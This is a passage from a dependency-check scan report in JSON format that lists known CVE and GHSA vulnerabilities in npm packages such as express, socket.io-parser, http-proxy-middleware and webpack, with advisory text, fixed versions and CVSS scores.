works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.5,"security-severity": "6.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "LOW","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2024-47764","shortDescription": {"text": "medium severity - CVE-2024-47764 Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') vulnerability in pkg:npm\/cookie@0.4.2"},"fullDescription": {"text": "cookie is a basic HTTP cookie parser and serializer for HTTP servers. The cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. A similar escape can be used for path and domain, which could be abused to alter other fields of the cookie. Upgrade to 0.7.0, which updates the validation for name, path, and domain."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv2_score": 6.900000095367432,"cvssv2_accessVector": "NETWORK","cvssv2_accessComplexity": "LOW","cvssv2_authenticationr": "$enc.json($rule.cvssv2Authentication)","cvssv2_confidentialityImpact": "$enc.json($rule.cvssv2ConfidentialityImpact)","cvssv2_integrityImpact": "$enc.json($rule.cvssv2IntegrityImpact)","cvssv2_availabilityImpact": "$enc.json($rule.cvssv2AvailabilityImpact)","cvssv2_severity": "MEDIUM","source": "OSSINDEX"}},{"id": "GHSA-67hx-6x53-jw92","shortDescription": {"text": "critical severity - GHSA-67hx-6x53-jw92 Incorrect Comparison vulnerability in pkg:npm\/%40babel%2Ftraverse@7.17.3"},"fullDescription": {"text": "### Impact\n\nUsing Babel to compile code that was specifically crafted by an attacker can lead to arbitrary code execution during compilation, when using plugins that rely on the `path.evaluate()`or `path.evaluateTruthy()` internal Babel methods.\n\nKnown affected plugins are:\n- `@babel\/plugin-transform-runtime`\n- `@babel\/preset-env` when using its [`useBuiltIns`](https:\/\/babeljs.io\/docs\/babel-preset-env#usebuiltins) option\n- Any \"polyfill provider\" plugin that depends on `@babel\/helper-define-polyfill-provider`, such as `babel-plugin-polyfill-corejs3`, `babel-plugin-polyfill-corejs2`, `babel-plugin-polyfill-es-shims`, `babel-plugin-polyfill-regenerator`\n\nNo other plugins under the `@babel\/` namespace are impacted, but third-party plugins might be.\n\n**Users that only compile trusted code are not impacted.**\n\n### Patches\n\nThe vulnerability has been fixed in `@babel\/traverse@7.23.2`.\n\nBabel 6 does not receive security fixes anymore (see [Babel's security policy](https:\/\/github.com\/babel\/babel\/security\/policy)), hence there is no patch planned for `babel-traverse@6`.\n\n### Workarounds\n\n- Upgrade `@babel\/traverse` to v7.23.2 or higher. You can do this by deleting it from your package manager's lockfile and re-installing the dependencies. `@babel\/core` >=7.23.2 will automatically pull in a non-vulnerable version.\n- If you cannot upgrade `@babel\/traverse` and are using one of the affected packages mentioned above, upgrade them to their latest version to avoid triggering the vulnerable code path in affected `@babel\/traverse` versions:\n  - `@babel\/plugin-transform-runtime` v7.23.2\n  - `@babel\/preset-env` v7.23.2\n  - `@babel\/helper-define-polyfill-provider` v0.4.3\n  - `babel-plugin-polyfill-corejs2` v0.4.6\n  - `babel-plugin-polyfill-corejs3` v0.8.5\n  - `babel-plugin-polyfill-es-shims` v0.10.0\n  - `babel-plugin-polyfill-regenerator` v0.5.3"},"help": {"text": "","markdown": "For more information see [GHSA-67hx-6x53-jw92](https://github.com/advisories/GHSA-67hx-6x53-jw92)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 9.399999618530273,"security-severity": "9.399999618530273","cvssv3_attackVector": "LOCAL","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "CHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "CRITICAL","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2024-21536","shortDescription": {"text": "high severity - CVE-2024-21536 Uncontrolled Resource Consumption vulnerability in pkg:npm\/http-proxy-middleware@2.0.3"},"fullDescription": {"text": "Versions of the package http-proxy-middleware before 2.0.7, from 3.0.0 and before 3.0.3 are vulnerable to Denial of Service (DoS) due to an UnhandledPromiseRejection error thrown by micromatch. An attacker could kill the Node.js process and crash the server by making requests to certain paths."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-3xgq-45jj-v275","shortDescription": {"text": "high severity - GHSA-3xgq-45jj-v275 Inefficient Regular Expression Complexity vulnerability in pkg:npm\/cross-spawn@7.0.3"},"fullDescription": {"text": "Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string."},"help": {"text": "","markdown": "For more information see [GHSA-3xgq-45jj-v275](https://github.com/advisories/GHSA-3xgq-45jj-v275)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2022-38900","shortDescription": {"text": "high severity - CVE-2022-38900 Improper Input Validation vulnerability in pkg:npm\/decode-uri-component@0.2.0"},"fullDescription": {"text": "decode-uri-component 0.2.0 is vulnerable to Improper Input Validation resulting in DoS."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2024-10491","shortDescription": {"text": "medium severity - CVE-2024-10491 Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') vulnerability in pkg:npm\/express@4.17.3"},"fullDescription": {"text": "A vulnerability has been identified in the Express response.links\u00A0function, allowing for arbitrary resource injection in the Link\u00A0header when unsanitized data is used.\n\nThe issue arises from improper sanitization in `Link` header values, which can allow a combination of characters like `,`, `;`, and `<>` to preload malicious resources.\n\nThis vulnerability is especially relevant for dynamic parameters.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2024-10491 for details"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 5.300000190734863,"security-severity": "5.300000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2023-31125","shortDescription": {"text": "medium severity - CVE-2023-31125 Uncaught Exception vulnerability in pkg:npm\/engine.io@6.1.2"},"fullDescription": {"text": "Engine.IO is the implementation of transport-based cross-browser\/cross-device bi-directional communication layer for Socket.IO. An uncaught exception vulnerability was introduced in version 5.1.0 and included in version 4.1.0 of the `socket.io` parent package. Older versions are not impacted. A specially crafted HTTP request can trigger an uncaught exception on the Engine.IO server, thus killing the Node.js process. This impacts all the users of the `engine.io` package, including those who use depending packages like `socket.io`. This issue was fixed in version 6.4.2 of Engine.IO. There is no known workaround except upgrading to a safe version."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.5,"security-severity": "6.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "LOW","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2023-32695","shortDescription": {"text": "high severity - CVE-2023-32695 Improper Input Validation vulnerability in pkg:npm\/socket.io-parser@4.0.4"},"fullDescription": {"text": "socket.io parser is a socket.io encoder and decoder written in JavaScript complying with version 5 of socket.io-protocol. A specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process. A patch has been released in version 4.2.3.\n\n\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2023-32695 for details"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2024-21538","shortDescription": {"text": "high severity - CVE-2024-21538 Inefficient Regular Expression Complexity vulnerability in pkg:npm\/cross-spawn@7.0.3"},"fullDescription": {"text": "Versions of the package cross-spawn before 6.0.6, from 7.0.0 and before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv2_score": 8.699999809265137,"cvssv2_accessVector": "NETWORK","cvssv2_accessComplexity": "LOW","cvssv2_authenticationr": "$enc.json($rule.cvssv2Authentication)","cvssv2_confidentialityImpact": "$enc.json($rule.cvssv2ConfidentialityImpact)","cvssv2_integrityImpact": "$enc.json($rule.cvssv2IntegrityImpact)","cvssv2_availabilityImpact": "$enc.json($rule.cvssv2AvailabilityImpact)","cvssv2_severity": "HIGH","source": "OSSINDEX"}},{"id": "GHSA-c7qv-q95q-8v27","shortDescription": {"text": "high severity - GHSA-c7qv-q95q-8v27 Uncontrolled Resource Consumption vulnerability in pkg:npm\/http-proxy-middleware@2.0.3"},"fullDescription": {"text": "Versions of the package http-proxy-middleware before 2.0.7, from 3.0.0 and before 3.0.3 are vulnerable to Denial of Service (DoS) due to an UnhandledPromiseRejection error thrown by micromatch. An attacker could kill the Node.js process and crash the server by making requests to certain paths."},"help": {"text": "","markdown": "For more information see [GHSA-c7qv-q95q-8v27](https://github.com/advisories/GHSA-c7qv-q95q-8v27)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-cqmj-92xf-r6r9","shortDescription": {"text": "medium severity - GHSA-cqmj-92xf-r6r9 Improper Check for Unusual or Exceptional Conditions vulnerability in pkg:npm\/socket.io-parser@4.0.4"},"fullDescription": {"text": "### Impact\n\nA specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process.\n\n```\nTypeError: Cannot convert object to primitive value\n       at Socket.emit (node:events:507:25)\n       at ...\/node_modules\/socket.io\/lib\/socket.js:531:14\n```\n\n### Patches\n\nA fix has been released today (2023\/05\/22):\n\n- https:\/\/github.com\/socketio\/socket.io-parser\/commit\/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3, included in `socket.io-parser@4.2.3`\n- https:\/\/github.com\/socketio\/socket.io-parser\/commit\/2dc3c92622dad113b8676be06f23b1ed46b02ced, included in `socket.io-parser@3.4.3`\n\n\nAnother fix has been released for the `3.3.x` branch:\n\n- https:\/\/github.com\/socketio\/socket.io-parser\/commit\/ee006607495eca4ec7262ad080dd3a91439a5ba4, included in `socket.io-parser@3.3.4\n\n| `socket.io` version | `socket.io-parser` version                                                                              | Needs minor update?                  |\n|---------------------|---------------------------------------------------------------------------------------------------------|--------------------------------------|\n| `4.5.2...latest`    | `~4.2.0` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | `npm audit fix` should be sufficient |\n| `4.1.3...4.5.1`     | `~4.1.1` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | Please upgrade to `socket.io@4.6.x`  |\n| `3.0.5...4.1.2`     | `~4.0.3` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | Please upgrade to `socket.io@4.6.x`  |\n| `3.0.0...3.0.4`     | `~4.0.1` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | Please upgrade to `socket.io@4.6.x`  |\n| `2.3.0...2.5.0`     | `~3.4.0` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/cf39362014f5ff13a17168b74772c43920d6e4fd)) | `npm audit fix` should be sufficient |\n\n\n### Workarounds\n\nThere is no known workaround except upgrading to a safe version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open a discussion [here](https:\/\/github.com\/socketio\/socket.io\/discussions)\n\nThanks to [@rafax00](https:\/\/github.com\/rafax00) for the responsible disclosure.\n"},"help": {"text": "","markdown": "For more information see [GHSA-cqmj-92xf-r6r9](https://github.com/advisories/GHSA-cqmj-92xf-r6r9)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.300000190734863,"security-severity": "7.300000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "LOW","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2025-32997","shortDescription": {"text": "medium severity - CVE-2025-32997 Improper Check for Unusual or Exceptional Conditions vulnerability in pkg:npm\/http-proxy-middleware@2.0.3"},"fullDescription": {"text": "In http-proxy-middleware before 2.0.9 and 3.x before 3.0.5, fixRequestBody proceeds even if bodyParser has failed."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv2_score": 6.300000190734863,"cvssv2_accessVector": "NETWORK","cvssv2_accessComplexity": "HIGH","cvssv2_authenticationr": "$enc.json($rule.cvssv2Authentication)","cvssv2_confidentialityImpact": "$enc.json($rule.cvssv2ConfidentialityImpact)","cvssv2_integrityImpact": "$enc.json($rule.cvssv2IntegrityImpact)","cvssv2_availabilityImpact": "$enc.json($rule.cvssv2AvailabilityImpact)","cvssv2_severity": "MEDIUM","source": "OSSINDEX"}},{"id": "CVE-2025-32996","shortDescription": {"text": "medium severity - CVE-2025-32996 Always-Incorrect Control Flow Implementation vulnerability in pkg:npm\/http-proxy-middleware@2.0.3"},"fullDescription": {"text": "In http-proxy-middleware before 2.0.8 and 3.x before 3.0.4, writeBody can be called twice because \"else if\" is not used."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv2_score": 6.300000190734863,"cvssv2_accessVector": "NETWORK","cvssv2_accessComplexity": "LOW","cvssv2_authenticationr": "$enc.json($rule.cvssv2Authentication)","cvssv2_confidentialityImpact": "$enc.json($rule.cvssv2ConfidentialityImpact)","cvssv2_integrityImpact": "$enc.json($rule.cvssv2IntegrityImpact)","cvssv2_availabilityImpact": "$enc.json($rule.cvssv2AvailabilityImpact)","cvssv2_severity": "MEDIUM","source": "OSSINDEX"}},{"id": "CVE-2025-7339","shortDescription": {"text": "medium severity - CVE-2025-7339 Improper Handling of Unexpected Data Type vulnerability in pkg:npm\/on-headers@1.0.2"},"fullDescription": {"text": "on-headers is a node.js middleware for listening to when a response writes headers. A bug in on-headers versions `<1.1.0` may result in response headers being inadvertently modified when an array is passed to `response.writeHead()`.\u00A0Users should upgrade to version 1.1.0 to receive a patch.\u00A0Uses are strongly encouraged to upgrade to `1.1.0`, but this issue can be worked around by passing an object to `response.writeHead()` rather than an array."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv2_score": 4.599999904632568,"cvssv2_accessVector": "LOCAL","cvssv2_accessComplexity": "LOW","cvssv2_authenticationr": "$enc.json($rule.cvssv2Authentication)","cvssv2_confidentialityImpact": "$enc.json($rule.cvssv2ConfidentialityImpact)","cvssv2_integrityImpact": "$enc.json($rule.cvssv2IntegrityImpact)","cvssv2_availabilityImpact": "$enc.json($rule.cvssv2AvailabilityImpact)","cvssv2_severity": "MEDIUM","source": "OSSINDEX"}},{"id": "GHSA-4wf5-vphf-c2xc","shortDescription": {"text": "high severity - GHSA-4wf5-vphf-c2xc Inefficient Regular Expression Complexity vulnerability in pkg:npm\/terser@5.10.0"},"fullDescription": {"text": "The package terser before 4.8.1, from 5.0.0 and before 5.14.2 are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure usage of regular expressions."},"help": {"text": "","markdown": "For more information see [GHSA-4wf5-vphf-c2xc](https://github.com/advisories/GHSA-4wf5-vphf-c2xc)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-2r2c-g63r-vccr","shortDescription": {"text": "medium severity - GHSA-2r2c-g63r-vccr Improper Verification of Cryptographic Signature vulnerability in pkg:npm\/node-forge@1.2.1"},"fullDescription": {"text": "### Impact\n\nRSA PKCS#1 v1.5 signature verification code is not properly checking `DigestInfo` for a proper ASN.1 structure. This can lead to successful verification with signatures that contain invalid structures but a valid digest.\n\n### Patches\n\nThe issue has been addressed in `node-forge` `1.3.0`.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [forge](https:\/\/github.com\/digitalbazaar\/forge)\n* Email us at [example email address](mailto:security@digitalbazaar.com)"},"help": {"text": "","markdown": "For more information see [GHSA-2r2c-g63r-vccr](https://github.com/advisories/GHSA-2r2c-g63r-vccr)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 5.300000190734863,"security-severity": "5.300000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-76c9-3jph-rj3q","shortDescription": {"text": "low severity - GHSA-76c9-3jph-rj3q Improper Handling of Unexpected Data Type vulnerability in pkg:npm\/on-headers@1.0.2"},"fullDescription": {"text": "### Impact\n\nA bug in on-headers versions `< 1.1.0` may result in response headers being inadvertently modified when an array is passed to `response.writeHead()`\n\n### Patches\n\nUsers should upgrade to `1.1.0`\n\n### Workarounds\n\nUses are encouraged to upgrade to `1.1.0`, but this issue can be worked around by passing an object to `response.writeHead()` rather than an array."},"help": {"text": "","markdown": "For more information see [GHSA-76c9-3jph-rj3q](https://github.com/advisories/GHSA-76c9-3jph-rj3q)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 3.4000000953674316,"security-severity": "3.4000000953674316","cvssv3_attackVector": "LOCAL","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "HIGH","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "LOW","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-fhg7-m89q-25r3","shortDescription": {"text": "high severity - GHSA-fhg7-m89q-25r3 Uncontrolled Resource Consumption vulnerability in pkg:npm\/ua-parser-js@0.7.31"},"fullDescription": {"text": "### Description:\nA regular expression denial of service (ReDoS) vulnerability has been discovered in `ua-parser-js`.\n\n### Impact:\nThis vulnerability bypass the library's `MAX_LENGTH` input limit prevention. By crafting a very-very-long user-agent string with specific pattern, an attacker can turn the script to get stuck processing for a very long time which results in a denial of service (DoS) condition.\n\n### Affected Versions:\nAll versions of the library prior to version `0.7.33` \/ `1.0.33`.\n\n### Patches:\nA patch has been released to remove the vulnerable regular expression, update to version `0.7.33` \/ `1.0.33` or later.\n\n### References:\n[Regular expression Denial of Service - ReDoS](https:\/\/owasp.org\/www-community\/attacks\/Regular_expression_Denial_of_Service_-_ReDoS)\n\n### Credits:\nThanks to @Snyk who first reported the issue."},"help": {"text": "","markdown": "For more information see [GHSA-fhg7-m89q-25r3](https://github.com/advisories/GHSA-fhg7-m89q-25r3)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-4vvj-4cpr-p986","shortDescription": {"text": "medium severity - GHSA-4vvj-4cpr-p986 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in pkg:npm\/webpack@5.67.0"},"fullDescription": {"text": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in Webpack\u2019s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nWe found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack\u2019s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.\n\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https:\/\/scnps.co\/papers\/sp23_domclob.pdf\n[2] https:\/\/research.securitum.com\/xss-in-amp4email-dom-clobbering\/\n\n\n#### Gadgets found in Webpack\n\nWe identified a DOM Clobbering vulnerability in Webpack\u2019s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:\n\n```\n\/******\/ \t\/* webpack\/runtime\/publicPath *\/\n\/******\/ \t(() => {\n\/******\/ \t\tvar scriptUrl;\n\/******\/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \"\";\n\/******\/ \t\tvar document = __webpack_require__.g.document;\n\/******\/ \t\tif (!scriptUrl && document) {\n\/******\/ \t\t\tif (document.currentScript)\n\/******\/ \t\t\t\tscriptUrl = document.currentScript.src;\n\/******\/ \t\t\tif 